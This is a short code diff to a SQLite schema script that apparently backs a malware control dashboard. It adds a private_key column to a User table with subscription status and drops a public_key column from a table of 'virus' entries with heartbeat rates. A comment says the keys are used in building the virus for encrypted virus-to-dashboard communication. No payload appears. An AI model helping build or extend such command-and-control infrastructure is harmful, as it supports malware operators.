@@ -6,12 +6,14 @@ conn = sqlite3.connect('instance/databasen.db')
 cursor = conn.cursor()
 
 #  Create the "User,Virus and Hosts" table if it does not already exist
+# User public and private key gets used in the making of the virus to ensure encrypted communication between virus and user on dashboard
 cursor.execute('''
     CREATE TABLE IF NOT EXISTS User (
         id INTEGER PRIMARY KEY,
         email TEXT,
         password TEXT,
         public_key TEXT,
+        private_key TEXT,
         subscription_status TEXT
     )
 ''')
@@ -21,7 +23,6 @@ cursor.execute('''
         type TEXT,
         name TEXT,
         heartbeat_rate TEXT,
-        public_key TEXT,
         user_id INTEGER
     )
 ''')
